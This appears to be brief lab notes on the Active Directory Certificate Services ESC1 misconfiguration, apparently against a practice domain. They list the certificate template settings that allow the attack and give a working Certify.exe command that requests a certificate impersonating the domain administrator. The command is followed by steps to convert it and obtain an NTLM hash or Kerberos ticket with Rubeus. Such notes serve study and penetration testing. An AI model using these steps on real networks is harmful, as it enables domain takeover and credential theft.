The vulnerability happens when a certificate template has:

1. **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag enabled
2. **Client Authentication** or **Any Purpose** EKU
3. **Domain Users** enrollment permissions
4. No **manager approval** required

We can request a certificate for the domain administrator.
```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
```

then convert to PFX

then Use Rubeus to either request NTLM hash directly or get a Kerberos TGT